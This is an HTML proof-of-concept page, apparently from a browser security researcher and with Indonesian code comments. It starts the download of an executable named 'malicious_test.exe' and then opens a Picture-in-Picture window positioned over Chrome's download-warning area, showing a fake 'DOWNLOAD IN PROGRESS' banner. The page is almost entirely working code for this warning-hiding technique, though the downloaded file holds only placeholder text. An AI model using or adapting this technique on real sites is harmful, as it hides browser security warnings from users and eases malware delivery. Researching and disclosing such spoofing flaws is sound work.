<!DOCTYPE html>
<html>
<head>
    <title>Research: File Interaction Obscuration</title>
    <style>
        body { font-family: sans-serif; background: #f4f4f4; text-align: center; padding-top: 100px; }
        .box { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); display: inline-block; }
        button { background: #db4437; color: white; border: none; padding: 15px 30px; border-radius: 5px; cursor: pointer; font-weight: bold; }
    </style>
</head>
<body>

<div class="box">
    <h2>File System Safety Test</h2>
    <p>Testing if PiP can obscure system download warnings.</p>
    <button id="downloadBtn">START TEST</button>
</div>

<script>
    document.getElementById('downloadBtn').addEventListener('click', async () => {
        // 1. Trigger Download File "Berbahaya" (Simulasi)
        const blob = new Blob(["test content"], { type: 'application/x-msdownload' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = 'malicious_test.exe';
        a.click();

        // 2. Langsung buka PiP buat nutupin area notifikasi (biasanya kanan atas atau bawah)
        const pipWin = await documentPictureInPicture.requestWindow({
            width: 400,
            height: 200,
        });

        // Posisikan PiP di area biasanya Chrome munculin peringatan download
        // Coba ganti-ganti koordinat ini pas ngetes
        pipWin.moveTo(window.screen.width - 450, 50); 

        pipWin.document.body.innerHTML = `
            <div style="background: #4285f4; color: white; height: 100vh; display: flex; align-items: center; justify-content: center; font-weight: bold;">
                DOWNLOAD IN PROGRESS... PLEASE WAIT
            </div>
        `;
    });
</script>
</body>
</html>
